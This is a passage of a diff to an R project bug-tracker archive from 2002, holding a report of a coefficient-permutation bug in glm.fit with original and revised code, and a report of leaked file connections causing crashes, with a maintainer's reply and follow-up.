+            warning("fitted rates numerically 0 occurred")
+    }
+    if (fit$rank != nvars) {
+        coef[fit$pivot][seq(fit$rank + 1, nvars)] <- NA
+    }
+    xxnames <- xnames[fit$pivot]
+    residuals <- rep(NA, nobs)
+    residuals[good] <- z - (eta - offset)[good]
+    fit$qr <- as.matrix(fit$qr)
+    nr <- min(sum(good), nvars)
+    if (nr < nvars) {
+        Rmat <- diag(nvars)
+        Rmat[1:nr, 1:nvars] <- fit$qr[1:nr, 1:nvars]
+    }
+    else Rmat <- fit$qr[1:nvars, 1:nvars]
+    Rmat <- as.matrix(Rmat)
+    Rmat[row(Rmat) > col(Rmat)] <- 0
+    names(coef) <- xnames
+    colnames(fit$qr) <- xxnames
+    dimnames(Rmat) <- list(xxnames, xxnames)
+    names(residuals) <- ynames
+    names(mu) <- ynames
+    names(eta) <- ynames
+    wt <- rep(0, nobs)
+    wt[good] <- w^2
+    names(wt) <- ynames
+    names(weights) <- ynames
+    names(y) <- ynames
+    names(fit$effects) <- c(xxnames[seq(fit$rank)], rep("", sum(good) - 
+        fit$rank))
+    wtdmu <- if (intercept) 
+        sum(weights * y)/sum(weights)
+
+==> 1331.audit <==
+Thu Mar  7 12:43:49 2002	ripley	moved from incoming to Models
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 Directory:  Startup
 
@@ -14072,807 +14631,6 @@ Version:
 Search Path:
  .GlobalEnv, package:ctest, Autoloads, package:base
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-* PR# 1331 *
-Subject: Bug in glm.fit?
-From: Berwin Turlach <berwin@maths.uwa.edu.au>
-Date: Wed, 27 Feb 2002 16:15:24 +0800 (WST)
--- no notes --
-~~~~~~~~~~ original reports follow ~~~~~~~~~~
-==> 1331 <==
-From postmaster@franz.stat.wisc.edu  Wed Feb 27 09:16:08 2002
-Received: from franz.stat.wisc.edu (root@franz.stat.wisc.edu [128.105.174.95])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id JAA23935
-	for <r-bugs@biostat.ku.dk>; Wed, 27 Feb 2002 09:16:06 +0100 (MET)
-Received: from bossiaea.maths.uwa.edu.au (really [130.95.16.247]) by franz.stat.wisc.edu
-	via smail with esmtp (ident root using rfc1413)
-	id <m16fzFN-000IaxC@franz.stat.wisc.edu> (Debian Smail3.2.0.114)
-	for <r-bugs@r-project.org>; Wed, 27 Feb 2002 02:15:33 -0600 (CST) 
-Received: (from berwin@localhost)
-	by bossiaea.maths.uwa.edu.au (8.9.3/8.9.3) id QAA21958;
-	Wed, 27 Feb 2002 16:15:24 +0800
-From: Berwin Turlach <berwin@maths.uwa.edu.au>
-MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Message-ID: <15484.38300.272751.70242@bossiaea.maths.uwa.edu.au>
-Date: Wed, 27 Feb 2002 16:15:24 +0800 (WST)
-To: r-bugs@r-project.org
-Subject: Bug in glm.fit?
-X-Mailer: VM 6.75 under Emacs 19.34.1
-
-G'day all,
-
-I had a look at the GLM code of R (1.4.1) and I believe that there are
-problems with the function "glm.fit" that may bite in rare
-circumstances.  Note, I have no data set with which I ran into
-trouble.  This report is solely based on having a look at the code.
-
-Below I append a listing of the glm.fit function as produced by my
-system.  I have added line numbers so that I can easily refer to the
-code that is, in my opinion, problematic.  I also append a modified
-version that, hopefully, solves these problems.  At least on
-"example(glm)" both functions produce the same output (if the random
-number generator is set to the same seed).
-
-Short summary: I envisage problems with glm.fit if two conditions are
-met simultaneously.  Namely, (1) the design matrix is such that the QR
-algorithm used in the weighted least squares (WLS) step has to pivot
-columns (lines 81-86) and (2) during the iterations the step size has
-to be truncated (either lines 98-114 or lines 115-130).
-
-More details:
-In line 90, the variables "start" and "coef" are set to the
-coefficients of the WLS and "start" is then permuted (line 91) to take
-a possible pivoting of the QR algorithm into account.  Note that
-"coef" is not permutated.   Also, since the weights in the iterative
-weighted least squares algorithm change in each iteration (lines
-60-139) it is theoretically possible that on some executions of this
-chunk pivoting occurs and on others there is no pivoting.
-
-Hoever, if the new coefficients are unsuitable and either the block at
-lines 98-114 or lines 115-130 is entered, then "start" is modified by
-shrinking it toward "coefold".  There are two problems:
-1) If this happens the first time the loop in lines 60-139 is executed,
-   then coefold is initialised to the value of "start" that was passed
-down to the routine (line 58).  This might well be NULL (usually is?).
-In this case line 105 and line 122 would produce a new "start" which
-is numeric(0) and glm.fit would stop execution pretty soon thereafter.
-2) If it happens during a later execution of the loop in lines 60-139,
-   then "coefold" was set to the value "coef" of the prior execution
-of the loop (line 137).  Depending on whether either of the code
-chunks at lines 98-114 or lines 115-130 have been executed on that
-previous occastion, "coefold" may or may not be permuted to the same
-order as "start" in this moment.  Hence, it could happen that "start"
-is shrunken towards something that doesn't make sense in line 105 or
-line 122.
-
-Relating to point 2) above.  Theoretically, during the main loop
-(lines 60-139) either of the chunks in lines 98-114 or lines 115-130
-could be entered.  In these chunks "coef" is set to the shrunken
-"start" at the end (line 111 or line 126).  If, with the ``deviance
-for the shrunken "start"'' the convergence criterion in line 131 is
-fulfilled, then the main loop would finish.  In other words, at line
-140 there is no way to tell whether "coef" is in the order of
-"fit$coefficients" or has been permutated to have the same order as
-"start".  In the later case, the additional permutation in line 157
-would garble the solution.
-
-I hope that the revised version that I append below, works around all
-these potential problems without breaking anything.  As I said, I ran
-"example(glm)" with the revised version and got the same results.  But
-I guess you guys have far more exhaustive tests and may want to do
-some further test to ensure that nothing is broken.
-
-The revised version also makes some cosmetic changes that reflect my
-preferences :-) :
-1) Given the default values of the parameters "weights" and "offset" I
-   was surprised about the tests in lines 17 and 19.  They seemed
-superfluous.  Until I noticed that "glm" can call "glm.fit" with
-actual arguments for these parameters that are NULL.  Hence, I suggest
-that the default values for these arguments should be NULL.  This
-makes it easier to understand the code of "glm.fit" (if one looks only
-at "glm.fit" and not at all the code "glm", "glm.fit" &c
-simultaneously). 
-2) As mentioned above, "coefold" may be initialised to NULL in line 58
-   if the parameter "start" is not specified.  (Which typically would be
-the case?)  But furthermore, in lines 44-53 the test for the parameter
-"start" is mangled into the test for the parameter "etastart".  If
-"etastart" is not specified but a bad "start" (not the correct
-length), the bad "start" would be caught.  But if a valid "etastart"
-is specified, then a bad "start" would not be caught since those tests
-are not executed.  (Are there users that specify both?).  Anyway, I
-have untangled those sanity check.  Also to get a clean initialisation
-for "coefold".
-3) Given that the column names of fit$qr are (correctly) set in line
-   171, I didn't see the purpose of line 155.  That line anyhow sets
-the column names wrongly if pivoting has occured.  So I deleted that
-line. 
-
-That's all for now.  Thanks for the great package and I hope that this
-bug report will be useful.
-
-Cheers,
-
-        Berwin
-
-========================= original glm.fit =========================
-  1  glm.fit <-
-  2  function (x, y, weights = rep(1, nobs), start = NULL, etastart = NULL, 
-  3      mustart = NULL, offset = rep(0, nobs), family = gaussian(), 
-  4      control = glm.control(), intercept = TRUE) 
-  5  {
-  6      x <- as.matrix(x)
-  7      xnames <- dimnames(x)[[2]]
-  8      ynames <- names(y)
-  9      conv <- FALSE
- 10      nobs <- NROW(y)
- 11      nvars <- NCOL(x)
- 12      if (nvars == 0) {
- 13          cc <- match.call()
- 14          cc[[1]] <- as.name("glm.fit.null")
- 15          return(eval(cc, parent.frame()))
- 16      }
- 17      if (is.null(weights)) 
- 18          weights <- rep(1, nobs)
- 19      if (is.null(offset)) 
- 20          offset <- rep(0, nobs)
- 21      variance <- family$variance
- 22      dev.resids <- family$dev.resids
- 23      aic <- family$aic
- 24      linkinv <- family$linkinv
- 25      mu.eta <- family$mu.eta
- 26      if (!is.function(variance) || !is.function(linkinv)) 
- 27          stop("illegal `family' argument")
- 28      valideta <- family$valideta
- 29      if (is.null(valideta)) 
- 30          valideta <- function(eta) TRUE
- 31      validmu <- family$validmu
- 32      if (is.null(validmu)) 
- 33          validmu <- function(mu) TRUE
- 34      if (is.null(mustart)) {
- 35          eval(family$initialize)
- 36      }
- 37      else {
- 38          mukeep <- mustart
- 39          eval(family$initialize)
- 40          mustart <- mukeep
- 41      }
- 42      if (NCOL(y) > 1) 
- 43          stop("y must be univariate unless binomial")
- 44      eta <- if (!is.null(etastart) && valideta(etastart)) 
- 45          etastart
- 46      else if (!is.null(start)) 
- 47          if (length(start) != nvars) 
- 48              stop(paste("Length of start should equal", nvars, 
- 49                  "and correspond to initial coefs for", deparse(xnames)))
- 50          else as.vector(if (NCOL(x) == 1) 
- 51              x * start
- 52          else x %*% start)
- 53      else family$linkfun(mustart)
- 54      mu <- linkinv(eta)
- 55      if (!(validmu(mu) && valideta(eta))) 
- 56          stop("Can't find valid starting values: please specify some")
- 57      devold <- sum(dev.resids(y, mu, weights))
- 58      coefold <- start
- 59      boundary <- FALSE
- 60      for (iter in 1:control$maxit) {
- 61          good <- weights > 0
- 62          varmu <- variance(mu)[good]
- 63          if (any(is.na(varmu))) 
- 64              stop("NAs in V(mu)")
- 65          if (any(varmu == 0)) 
- 66              stop("0s in V(mu)")
- 67          mu.eta.val <- mu.eta(eta)
- 68          if (any(is.na(mu.eta.val[good]))) 
- 69              stop("NAs in d(mu)/d(eta)")
- 70          good <- (weights > 0) & (mu.eta.val != 0)
- 71          if (all(!good)) {
- 72              conv <- FALSE
- 73              warning(paste("No observations informative at iteration", 
- 74                  iter))
- 75              break
- 76          }
- 77          z <- (eta - offset)[good] + (y - mu)[good]/mu.eta.val[good]
- 78          w <- sqrt((weights[good] * mu.eta.val[good]^2)/variance(mu)[good])
- 79          ngoodobs <- as.integer(nobs - sum(!good))
- 80          ncols <- as.integer(1)
- 81          fit <- .Fortran("dqrls", qr = x[good, ] * w, n = as.integer(ngoodobs), 
- 82              p = nvars, y = w * z, ny = ncols, tol = min(1e-07, 
- 83                  control$epsilon/1000), coefficients = numeric(nvars), 
- 84              residuals = numeric(ngoodobs), effects = numeric(ngoodobs), 
- 85              rank = integer(1), pivot = 1:nvars, qraux = double(nvars), 
- 86              work = double(2 * nvars), PACKAGE = "base")
- 87          if (nobs < fit$rank) 
- 88              stop(paste("X matrix has rank", fit$rank, "but only", 
- 89                  nobs, "observations"))
- 90          start <- coef <- fit$coefficients
- 91          start[fit$pivot] <- coef
- 92          eta <- drop(x %*% start)
- 93          mu <- linkinv(eta <- eta + offset)
- 94          dev <- sum(dev.resids(y, mu, weights))
- 95          if (control$trace) 
- 96              cat("Deviance =", dev, "Iterations -", iter, "\n")
- 97          boundary <- FALSE
- 98          if (is.na(dev) || any(is.na(coef))) {
- 99              warning("Step size truncated due to divergence")
-100              ii <- 1
-101              while ((is.na(dev) || any(is.na(start)))) {
-102                  if (ii > control$maxit) 
-103                    stop("inner loop 1; can't correct step size")
-104                  ii <- ii + 1
-105                  start <- (start + coefold)/2
-106                  eta <- drop(x %*% start)
-107                  mu <- linkinv(eta <- eta + offset)
-108                  dev <- sum(dev.resids(y, mu, weights))
-109              }
-110              boundary <- TRUE
-111              coef <- start
-112              if (control$trace) 
-113                  cat("New Deviance =", dev, "\n")
-114          }
-115          if (!(valideta(eta) && validmu(mu))) {
-116              warning("Step size truncated: out of bounds.")
-117              ii <- 1
-118              while (!(valideta(eta) && validmu(mu))) {
-119                  if (ii > control$maxit) 
-120                    stop("inner loop 2; can't correct step size")
-121                  ii <- ii + 1
-122                  start <- (start + coefold)/2
-123                  mu <- linkinv(eta <- eta + offset)
-124              }
-125              boundary <- TRUE
-126              coef <- start
-127              dev <- sum(dev.resids(y, mu, weights))
-128              if (control$trace) 
-129                  cat("New Deviance =", dev, "\n")
-130          }
-131          if (abs(dev - devold)/(0.1 + abs(dev)) < control$epsilon) {
-132              conv <- TRUE
-133              break
-134          }
-135          else {
-136              devold <- dev
-137              coefold <- coef
-138          }
-139      }
-140      if (!conv) 
-141          warning("Algorithm did not converge")
-142      if (boundary) 
-143          warning("Algorithm stopped at boundary value")
-144      eps <- 10 * .Machine$double.eps
-145      if (family$family == "binomial") {
-146          if (any(mu > 1 - eps) || any(mu < eps)) 
-147              warning("fitted probabilities numerically 0 or 1 occurred")
-148      }
-149      if (family$family == "poisson") {
-150          if (any(mu < eps)) 
-151              warning("fitted rates numerically 0 occurred")
-152      }
-153      if (fit$rank != nvars) {
-154          coef[seq(fit$rank + 1, nvars)] <- NA
-155          dimnames(fit$qr) <- list(NULL, xnames)
-156      }
-157      coef[fit$pivot] <- coef
-158      xxnames <- xnames[fit$pivot]
-159      residuals <- rep(NA, nobs)
-160      residuals[good] <- z - (eta - offset)[good]
-161      fit$qr <- as.matrix(fit$qr)
-162      nr <- min(sum(good), nvars)
-163      if (nr < nvars) {
-164          Rmat <- diag(nvars)
-165          Rmat[1:nr, 1:nvars] <- fit$qr[1:nr, 1:nvars]
-166      }
-167      else Rmat <- fit$qr[1:nvars, 1:nvars]
-168      Rmat <- as.matrix(Rmat)
-169      Rmat[row(Rmat) > col(Rmat)] <- 0
-170      names(coef) <- xnames
-171      colnames(fit$qr) <- xxnames
-172      dimnames(Rmat) <- list(xxnames, xxnames)
-173      names(residuals) <- ynames
-174      names(mu) <- ynames
-175      names(eta) <- ynames
-176      wt <- rep(0, nobs)
-177      wt[good] <- w^2
-178      names(wt) <- ynames
-179      names(weights) <- ynames
-180      names(y) <- ynames
-181      names(fit$effects) <- c(xxnames[seq(fit$rank)], rep("", sum(good) - 
-182          fit$rank))
-183      wtdmu <- if (intercept) 
-184          sum(weights * y)/sum(weights)
-185      else linkinv(offset)
-186      nulldev <- sum(dev.resids(y, wtdmu, weights))
-187      n.ok <- nobs - sum(weights == 0)
-188      nulldf <- n.ok - as.integer(intercept)
-189      resdf <- n.ok - fit$rank
-190      aic.model <- aic(y, n, mu, weights, dev) + 2 * fit$rank
-191      list(coefficients = coef, residuals = residuals, fitted.values = mu, 
-192          effects = fit$effects, R = Rmat, rank = fit$rank, qr = fit[c("qr", 
-193              "rank", "qraux", "pivot", "tol")], family = family, 
-194          linear.predictors = eta, deviance = dev, aic = aic.model, 
-195          null.deviance = nulldev, iter = iter, weights = wt, prior.weights = weights, 
-196          df.residual = resdf, df.null = nulldf, y = y, converged = conv, 
-197          boundary = boundary)
-198  }
-========================= modified glm.fit =========================
-glm.fit <- 
-function (x, y, weights = NULL, start = NULL, etastart = NULL, 
-    mustart = NULL, offset = NULL, family = gaussian(), 
-    control = glm.control(), intercept = TRUE) 
-{
-    x <- as.matrix(x)
-    xnames <- dimnames(x)[[2]]
-    ynames <- names(y)
-    conv <- FALSE
-    nobs <- NROW(y)
-    nvars <- NCOL(x)
-    if (nvars == 0) {
-        cc <- match.call()
-        cc[[1]] <- as.name("glm.fit.null")
-        return(eval(cc, parent.frame()))
-    }
-    if (is.null(weights)) 
-        weights <- rep(1, nobs)
-    if (is.null(offset)) 
-        offset <- rep(0, nobs)
-    variance <- family$variance
-    dev.resids <- family$dev.resids
-    aic <- family$aic
-    linkinv <- family$linkinv
-    mu.eta <- family$mu.eta
-    if (!is.function(variance) || !is.function(linkinv)) 
-        stop("illegal `family' argument")
-    valideta <- family$valideta
-    if (is.null(valideta)) 
-        valideta <- function(eta) TRUE
-    validmu <- family$validmu
-    if (is.null(validmu)) 
-        validmu <- function(mu) TRUE
-    if (is.null(mustart)) {
-        eval(family$initialize)
-    }
-    else {
-        mukeep <- mustart
-        eval(family$initialize)
-        mustart <- mukeep
-    }
-    if (NCOL(y) > 1) 
-        stop("y must be univariate unless binomial")
-    if (!is.null(start)){
-      if (length(start) != nvars) 
-        stop(paste("Length of start should equal", nvars, 
-                   "and correspond to initial coefs for", deparse(xnames)))
-      coef <- coefold <- start  # initialise coef here in order to
-                                # be able to subset it below 
-    }
-    else
-      coef <- coefold <- rep(0,nvars)
-    eta <- if (!is.null(etastart) && valideta(etastart)) 
-      etastart
-    else if (!is.null(start)) 
-      as.vector(if (NCOL(x) == 1) 
-                x * start
-      else x %*% start)
-    else family$linkfun(mustart)
-    mu <- linkinv(eta)
-    if (!(validmu(mu) && valideta(eta))) 
-        stop("Can't find valid starting values: please specify some")
-    devold <- sum(dev.resids(y, mu, weights))
-    boundary <- FALSE
-    for (iter in 1:control$maxit) {
-        good <- weights > 0
-        varmu <- variance(mu)[good]
-        if (any(is.na(varmu))) 
-            stop("NAs in V(mu)")
-        if (any(varmu == 0)) 
-            stop("0s in V(mu)")
-        mu.eta.val <- mu.eta(eta)
-        if (any(is.na(mu.eta.val[good]))) 
-            stop("NAs in d(mu)/d(eta)")
-        good <- (weights > 0) & (mu.eta.val != 0)
-        if (all(!good)) {
-            conv <- FALSE
-            warning(paste("No observations informative at iteration", 
-                iter))
-            break
-        }
-        z <- (eta - offset)[good] + (y - mu)[good]/mu.eta.val[good]
-        w <- sqrt((weights[good] * mu.eta.val[good]^2)/variance(mu)[good])
-        ngoodobs <- as.integer(nobs - sum(!good))
-        ncols <- as.integer(1)
-        fit <- .Fortran("dqrls", qr = x[good, ] * w, n = as.integer(ngoodobs), 
-            p = nvars, y = w * z, ny = ncols, tol = min(1e-07, 
-                control$epsilon/1000), coefficients = numeric(nvars), 
-            residuals = numeric(ngoodobs), effects = numeric(ngoodobs), 
-            rank = integer(1), pivot = 1:nvars, qraux = double(nvars), 
-            work = double(2 * nvars), PACKAGE = "base")
-        if (nobs < fit$rank) 
-            stop(paste("X matrix has rank", fit$rank, "but only", 
-                nobs, "observations"))
-        coef[fit$pivot] <- fit$coefficients
-        eta <- drop(x %*% coef)
-        mu <- linkinv(eta <- eta + offset)
-        dev <- sum(dev.resids(y, mu, weights))
-        if (control$trace) 
-            cat("Deviance =", dev, "Iterations -", iter, "\n")
-        boundary <- FALSE
-        if (is.na(dev) || any(is.na(coef))) {
-            warning("Step size truncated due to divergence")
-            ii <- 1
-            while ((is.na(dev) || any(is.na(coef)))) {
-                if (ii > control$maxit) 
-                  stop("inner loop 1; can't correct step size")
-                ii <- ii + 1
-                coef <- (coef + coefold)/2
-                eta <- drop(x %*% coef)
-                mu <- linkinv(eta <- eta + offset)
-                dev <- sum(dev.resids(y, mu, weights))
-            }
-            boundary <- TRUE
-            if (control$trace) 
-                cat("New Deviance =", dev, "\n")
-        }
-        if (!(valideta(eta) && validmu(mu))) {
-            warning("Step size truncated: out of bounds.")
-            ii <- 1
-            while (!(valideta(eta) && validmu(mu))) {
-                if (ii > control$maxit) 
-                  stop("inner loop 2; can't correct step size")
-                ii <- ii + 1
-                coef <- (coef + coefold)/2
-                mu <- linkinv(eta <- eta + offset)
-            }
-            boundary <- TRUE
-            dev <- sum(dev.resids(y, mu, weights))
-            if (control$trace) 
-                cat("New Deviance =", dev, "\n")
-        }
-        if (abs(dev - devold)/(0.1 + abs(dev)) < control$epsilon) {
-            conv <- TRUE
-            break
-        }
-        else {
-            devold <- dev
-            coefold <- coef
-        }
-    }
-    if (!conv) 
-        warning("Algorithm did not converge")
-    if (boundary) 
-        warning("Algorithm stopped at boundary value")
-    eps <- 10 * .Machine$double.eps
-    if (family$family == "binomial") {
-        if (any(mu > 1 - eps) || any(mu < eps)) 
-            warning("fitted probabilities numerically 0 or 1 occurred")
-    }
-    if (family$family == "poisson") {
-        if (any(mu < eps)) 
-            warning("fitted rates numerically 0 occurred")
-    }
-    if (fit$rank != nvars) {
-        coef[fit$pivot][seq(fit$rank + 1, nvars)] <- NA
-    }
-    xxnames <- xnames[fit$pivot]
-    residuals <- rep(NA, nobs)
-    residuals[good] <- z - (eta - offset)[good]
-    fit$qr <- as.matrix(fit$qr)
-    nr <- min(sum(good), nvars)
-    if (nr < nvars) {
-        Rmat <- diag(nvars)
-        Rmat[1:nr, 1:nvars] <- fit$qr[1:nr, 1:nvars]
-    }
-    else Rmat <- fit$qr[1:nvars, 1:nvars]
-    Rmat <- as.matrix(Rmat)
-    Rmat[row(Rmat) > col(Rmat)] <- 0
-    names(coef) <- xnames
-    colnames(fit$qr) <- xxnames
-    dimnames(Rmat) <- list(xxnames, xxnames)
-    names(residuals) <- ynames
-    names(mu) <- ynames
-    names(eta) <- ynames
-    wt <- rep(0, nobs)
-    wt[good] <- w^2
-    names(wt) <- ynames
-    names(weights) <- ynames
-    names(y) <- ynames
-    names(fit$effects) <- c(xxnames[seq(fit$rank)], rep("", sum(good) - 
-        fit$rank))
-    wtdmu <- if (intercept) 
-        sum(weights * y)/sum(weights)
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-* PR# 1333 *
-Subject: Failed file("foo", "r") keeps file open?
-From: hb@maths.lth.se
-Date: Thu, 28 Feb 2002 17:20:02 +0100 (MET)
--- no notes --
-~~~~~~~~~~ original reports follow ~~~~~~~~~~
-==> 1333 <==
-From hb@maths.lth.se  Thu Feb 28 17:20:03 2002
-Received: from blueberry.kubism.ku.dk (blueberry [192.38.19.4])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id RAA09126
-	for <R-bugs@biostat.ku.dk>; Thu, 28 Feb 2002 17:20:02 +0100 (MET)
-Date: Thu, 28 Feb 2002 17:20:02 +0100 (MET)
-From: hb@maths.lth.se
-Message-Id: <200202281620.RAA09126@pubhealth.ku.dk>
-To: R-bugs@biostat.ku.dk
-Subject: Failed file("foo", "r") keeps file open?
-
-Full_Name: Henrik Bengtsson
-Version: R v1.4.0
-OS: Solaris 8
-Submission from: (NULL) (130.235.3.49)
-
-
-When I am trying the following on Rv1.4.0 on Solaris 8, I get that the
-"cannot close output sink connection":
- 
- % R --vanilla
-
- tmpfile <- tempfile()  # Create a filename that does not exist
- for(k in 1:100) {
-   cat(k, ": ");
-   try(fh <- file(tmpfile, "r"))
-   close(file("tmp.txt", "w"))   # Opens and closes a file for writing.
- }
- 
-1 Error in file(tempfile(), "r") : cannot open file `/tmp/fileR70d5S167e'
-2 Error in file(tempfile(), "r") : cannot open file `/tmp/fileR70d5S2781'
-...
-47 Error in file(tempfile(), "r") : cannot open file `/tmp/fileR70d5S345b'
-Error in close.connection(file("tmp.txt", "w")) :
-        cannot close output sink connection
- 
-It always happens after 48 failed file openings.
-
-
-To me it looks like failed 'file(tmpfile, "r")' does not correctly
-clean up after itself. And since 'fh' is never assigned it can neither
-be solved by a 'close(fh)'.
-
-FYI: Doing a cat(file="tmp.txt", k") instead of the close(file(...)) call,
-will produce a "sink stack is full" error.
-
-FYI2: After the failure above, trying to call sink() will result in a
-      "Segmentation fault" and [R] is stopped.
-
-Background: I ran into this problem after have been running the same
-script several times over several days I eventually ran into the problem.
-It was hard to identify the problem, but I believe the above example shows
-the core of it and I could not track the problem further.
-
-Unfortunately, I do not have access to R v1.4.1 for Solaris 8.
-
-
-==> 1333.followup.1 <==
-From ripley@stats.ox.ac.uk  Thu Feb 28 18:59:55 2002
-Received: from toucan.stats.ox.ac.uk (toucan.stats.ox.ac.uk [163.1.20.20])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id SAA09551
-	for <R-bugs@biostat.ku.dk>; Thu, 28 Feb 2002 18:59:54 +0100 (MET)
-Received: from localhost (ripley@localhost)
-	by toucan.stats.ox.ac.uk (8.9.0/8.9.0) with ESMTP id RAA10758;
-	Thu, 28 Feb 2002 17:59:21 GMT
-X-Authentication-Warning: toucan.stats: ripley owned process doing -bs
-Date: Thu, 28 Feb 2002 17:59:20 +0000 (GMT)
-From: Prof Brian Ripley <ripley@stats.ox.ac.uk>
-X-X-Sender:  <ripley@toucan.stats>
-To: <hb@maths.lth.se>
-cc: <R-bugs@biostat.ku.dk>
-Subject: Re: [Rd] Failed file("foo", "r") keeps file open? (PR#1333)
-In-Reply-To: <200202281620.RAA09131@pubhealth.ku.dk>
-Message-ID: <Pine.GSO.4.31.0202281755580.10755-100000@toucan.stats>
-MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
-
-On Thu, 28 Feb 2002 hb@maths.lth.se wrote:
-
-> Full_Name: Henrik Bengtsson
-> Version: R v1.4.0
-> OS: Solaris 8
-> Submission from: (NULL) (130.235.3.49)
->
->
-> When I am trying the following on Rv1.4.0 on Solaris 8, I get that the
-> "cannot close output sink connection":
->
->  % R --vanilla
->
->  tmpfile <- tempfile()  # Create a filename that does not exist
->  for(k in 1:100) {
->    cat(k, ": ");
->    try(fh <- file(tmpfile, "r"))
->    close(file("tmp.txt", "w"))   # Opens and closes a file for writing.
->  }
->
-> 1 Error in file(tempfile(), "r") : cannot open file `/tmp/fileR70d5S167e'
-> 2 Error in file(tempfile(), "r") : cannot open file `/tmp/fileR70d5S2781'
-> ...
-> 47 Error in file(tempfile(), "r") : cannot open file `/tmp/fileR70d5S345b'
-> Error in close.connection(file("tmp.txt", "w")) :
->         cannot close output sink connection
->
-> It always happens after 48 failed file openings.
->
->
-> To me it looks like failed 'file(tmpfile, "r")' does not correctly
-> clean up after itself. And since 'fh' is never assigned it can neither
-> be solved by a 'close(fh)'.
-
-It does correctly clean up: it should leave a connection which is not
-opened.  That may not be the best design, but it is the design.
-
-Take a look at closeAllConnections.
-
-It's better to call file() and then open(), which will avoid the problem.
-
-
-> FYI: Doing a cat(file="tmp.txt", k") instead of the close(file(...)) call,
-> will produce a "sink stack is full" error.
->
-> FYI2: After the failure above, trying to call sink() will result in a
->       "Segmentation fault" and [R] is stopped.
->
-> Background: I ran into this problem after have been running the same
-> script several times over several days I eventually ran into the problem.
-> It was hard to identify the problem, but I believe the above example shows
-> the core of it and I could not track the problem further.
->
-> Unfortunately, I do not have access to R v1.4.1 for Solaris 8.
->
->
-> -.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-
-> r-devel mailing list -- Read http://www.ci.tuwien.ac.at/~hornik/R/R-FAQ.html
-> Send "info", "help", or "[un]subscribe"
-> (in the "body", not the subject !)  To: r-devel-request@stat.math.ethz.ch
-> _._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._._
->
-
--- 
-Brian D. Ripley,                  ripley@stats.ox.ac.uk
-Professor of Applied Statistics,  http://www.stats.ox.ac.uk/~ripley/
-University of Oxford,             Tel:  +44 1865 272861 (self)
-1 South Parks Road,                     +44 1865 272860 (secr)
-Oxford OX1 3TG, UK                Fax:  +44 1865 272595
-
-
-==> 1333.followup.2 <==
-From hb@maths.lth.se  Thu Feb 28 20:16:03 2002
-Received: from nic.lth.se (nic.lth.se [130.235.20.3])
-	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id UAA09734
-	for <R-bugs@biostat.ku.dk>; Thu, 28 Feb 2002 20:16:02 +0100 (MET)
-Received: from maths.lth.se (kolmogorov.maths.lth.se [130.235.3.6])
-	by nic.lth.se (8.9.3/8.9.3) with ESMTP id UAA12088;
-	Thu, 28 Feb 2002 20:15:30 +0100 (MET)
-Received: from speed (speed [130.235.3.49])
-	by maths.lth.se (8.9.3+Sun/8.9.1) with ESMTP id UAA20214;
-	Thu, 28 Feb 2002 20:15:28 +0100 (MET)
-Date: Thu, 28 Feb 2002 20:15:26 +0100 (MET)
-From: Henrik Bengtsson <hb@maths.lth.se>
-To: Prof Brian Ripley <ripley@stats.ox.ac.uk>
-cc: R-bugs@biostat.ku.dk
-Subject: Re: [Rd] Failed file("foo", "r") keeps file open? (PR#1333)
-In-Reply-To: <Pine.GSO.4.31.0202281755580.10755-100000@toucan.stats>
-Message-ID: <Pine.GSO.4.10.10202281953450.29084-100000@speed.maths.lth.se>
-MIME-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
-
-On Thu, 28 Feb 2002, Prof Brian Ripley wrote:
-
-> On Thu, 28 Feb 2002 hb@maths.lth.se wrote:
-> 
-> > Full_Name: Henrik Bengtsson
-> > Version: R v1.4.0
-> > OS: Solaris 8
-> > Submission from: (NULL) (130.235.3.49)
-> >
-> >
-> > When I am trying the following on Rv1.4.0 on Solaris 8, I get that the
-> > "cannot close output sink connection":
-> >
-> >  % R --vanilla
-> >
-> >  tmpfile <- tempfile()  # Create a filename that does not exist
-> >  for(k in 1:100) {
-> >    cat(k, ": ");
-> >    try(fh <- file(tmpfile, "r"))
-> >    close(file("tmp.txt", "w"))   # Opens and closes a file for writing.
-> >  }
-> >
-> > 1 Error in file(tempfile(), "r") : cannot open file `/tmp/fileR70d5S167e'
-> > 2 Error in file(tempfile(), "r") : cannot open file `/tmp/fileR70d5S2781'
-> > ...
-> > 47 Error in file(tempfile(), "r") : cannot open file `/tmp/fileR70d5S345b'
-> > Error in close.connection(file("tmp.txt", "w")) :
-> >         cannot close output sink connection
-> >
-> > It always happens after 48 failed file openings.
-> >
-> >
-> > To me it looks like failed 'file(tmpfile, "r")' does not correctly
-> > clean up after itself. And since 'fh' is never assigned it can neither
-> > be solved by a 'close(fh)'.
-> 
-> It does correctly clean up: it should leave a connection which is not
-> opened.  That may not be the best design, but it is the design.
-> 
-> Take a look at closeAllConnections.
-
-Accepting the design, calling file(tempfile(), open="r"), will, as
-you say, create a "closed" connection as seen by
-showConnections(all=TRUE) and it can be deleted by identifying the
-connection id from the list and the closing it with
-
-  fh <- getConnection(id)
-  close(fh)
-
-or one could call closeAllConnections(), which is not always what you
-want. However, if one creates TOO MANY failed connections as above,
-neither of the above works:
-
-  % R --vanilla
-
-  K <- 48; # K <- 47 is ok.
-  tmpfile <- tempfile()
-  for(k in 1:K) try(fh <- file(tmpfile, "r"))
-
-will make [R] stall when closeAllConnections() is called. Doing Ctrl+C and
-trying do anything, e.g. "ls() [ENTER]", will generate a "Segmentation
-fault" or "0 [ENTER]" will generate a "Bus error". Trying to use
-
-  fh <- getConnection(id)
-  close(fh)
-
-gives "Error in close.connection(fh) : cannot close output sink
-connection". In this case there is not fatal quitting of [R].
-
-I don't think it is a common thing to end up in this situation, but even
-with the design you refer to, I still think something should be fixed
